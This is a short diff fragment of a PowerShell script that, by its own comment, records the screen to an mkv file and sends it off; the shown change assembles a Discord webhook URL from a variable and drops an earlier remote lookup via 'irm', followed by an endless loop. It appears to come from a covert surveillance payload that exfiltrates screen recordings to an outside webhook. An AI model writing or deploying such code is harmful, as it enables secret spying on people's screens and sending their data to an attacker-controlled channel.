@@ -6,7 +6,9 @@ This script records the screen for a specified time to a mkv file, then sends th
 #>
 
 $hookurl = "$dc"
-if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 while($true){
 
